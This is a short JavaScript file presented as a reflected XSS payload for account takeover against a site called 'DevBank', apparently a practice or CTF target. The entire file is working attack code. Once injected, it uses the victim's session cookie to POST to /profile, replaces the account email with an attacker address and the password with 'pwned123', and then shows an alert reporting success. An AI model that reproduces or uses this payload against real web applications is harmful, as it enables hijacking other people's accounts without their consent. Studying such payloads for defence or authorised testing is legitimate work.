// payload.js - Reflected XSS account takeover for DevBank
(function () {
  // modify the email and password of victim
  const newEmail = "hacked@evil.com";
  const newPassword = "pwned123";

  fetch("/profile", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: `email=${encodeURIComponent(newEmail)}&password=${encodeURIComponent(newPassword)}`,
    credentials: "include"   // bring the session cookie of the victim
  })
    .then((res) => {
      if (res.ok || res.redirected) {
        // show off something
        alert("Account takeover successful!\nEmail → " + newEmail + "\nPassword → " + newPassword);
        // just redirecting
        // location.href = "/profile";
      } else {
        alert("Takeover failed, status: " + res.status);
      }
    })
    .catch((err) => {
      alert("Error: " + err);
    });
})();
